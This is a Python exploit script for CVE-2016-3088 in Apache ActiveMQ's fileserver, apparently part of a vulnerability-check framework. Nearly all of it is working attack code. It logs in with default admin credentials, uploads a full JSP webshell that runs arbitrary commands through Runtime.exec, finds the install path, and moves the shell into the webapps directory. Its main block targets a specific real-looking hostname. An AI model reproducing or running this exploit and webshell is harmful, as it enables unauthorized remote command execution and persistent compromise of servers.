#!/usr/bin/env python3

'''
name: CVE-2016-3088漏洞
description: CVE-2016-3088漏洞可上传文件,上传shell需要账号密码,在headers中Authorization设置
'''

import re
import time
import base64
from app.lib.utils.request import request

class CVE_2016_3088_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.put_file_path = "/fileserver/tmp_2016.txt"
        self.local_shell_path = ""
        self.move_shell_path = ""
        self.get_install_path_url = []
        self.install_path = ""
        self.webshell_path_list = []
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Authorization": "Basic YWRtaW46YWRtaW4="
        }
        self.webshell_content = '''
            <%@ page import="java.util.*,java.io.*"%>
            <%
            %>
            <HTML><BODY>
            Commands with JSP
            <FORM METHOD="GET" NAME="myform" ACTION="">
            <INPUT TYPE="text" NAME="cmd">
            <INPUT TYPE="submit" VALUE="Send">
            </FORM>
            <pre>
            <%
            if (request.getParameter("cmd") != null) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
            }
            }
            %>
            </pre>
            </BODY></HTML>
        '''

    def init_shell_fie(self):
        timetemp = time.time()
        tmp_file_name = str(int(timetemp))
        self.put_file_path = "/fileserver/" + tmp_file_name + ".txt"
        webshell_path_one = "/api/" + tmp_file_name + ".jsp"
        webshell_path_two = "/admin/test/" + tmp_file_name + ".jsp"
        # 在两个地方写shell
        self.webshell_path_list.append(webshell_path_one)
        self.webshell_path_list.append(webshell_path_two)

    def checkfile(self, file_path):
        try:
            print("[+]Trying PUT.." + self.put_file_path)
            req = request.get(file_path, headers = self.headers)
            if req.status_code == 200 or req.status_code != 404:
                return True
            else:
                return False
        except Exception as e:
            print("Check File : Wrong")
            print(e)

    def deal_path(self, install_path):
        real_install_path = ""
        tmppath = install_path
        # linux系统
        if ":" not in install_path:
            real_install_path = tmppath
        # win系统
        else:
            tmp_list = tmppath.split("\\")
            range_index = len(tmp_list) - (tmppath.count("..")*2)
            for k in range(0, range_index):
                real_install_path = real_install_path + "\\"+tmp_list[k]
            real_install_path = real_install_path[1:]
        # print "real_install_path = "+real_install_path
        return real_install_path

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.init_shell_fie()
        self.put_file_path = self.url + self.put_file_path
        check_url = self.put_file_path
        put_req = request.put(self.put_file_path, headers = self.headers, data = self.webshell_content)
        time.sleep(2)
        if (self.checkfile(self.put_file_path)):
            print("存在CVE-2016-3088漏洞")
            print ("[+]寻找Web应用安装路径")
            self.get_install_path_url.append("/admin/test/systemProperties.jsp")
            self.get_install_path_url.append("/admin/test/index.jsp")
            for get_install_path_url in self.get_install_path_url:
                get_install_path_url = self.url + get_install_path_url
                try:
                    get_install_path_req = request.get(get_install_path_url, headers = self.headers)
                    pattern = re.compile('<td class="label">.*?</td>.|\\n*<td>(.*)</td>')
                    deal_path = pattern.findall(get_install_path_req.text)
                    tempIndex = self.deal_path(deal_path[13])
                    time.sleep(1)
                except Exception as  e:
                    print(e)
                    continue
            if tempIndex is None:
                print("寻找Web应用路径失败")
            else:
                print ("[+]找到安装路径:" + tempIndex)
            self.install_path = tempIndex
            path_list = self.install_path.split("\\")
            temp_shell_path = ""
            if len(path_list) == 1:
                path_list = self.install_path.split("/")
            temp_shell_path = self.url
            for item in path_list[1:]:
                temp_shell_path = temp_shell_path+"/"+item
            temp_shell_path = temp_shell_path + "/webapps"
            # 得到MOVE_PATH
            print("[+]最后一步,MOVE得到shell")
            for webshell_path in self.webshell_path_list:
                self.move_shell_path = temp_shell_path + webshell_path
                self.headers['Destination'] = self.move_shell_path
                move_file_req = request.request('MOVE', self.put_file_path, headers = self.headers)
                web_shell = self.url + webshell_path
                if (self.checkfile(web_shell)):
                    print("上传shell成功,路径为", web_shell)
                    return True
                else:
                    print("上传shell失败！")
            return True
        else:
            print ("不存在CVE-2016-3088漏洞")
            return False

if __name__ == '__main__':
    CVE_2016_3088 = CVE_2016_3088_BaseVerify('http://ailink-iot-test.chiq-cloud.com:32001/')
    CVE_2016_3088.run()
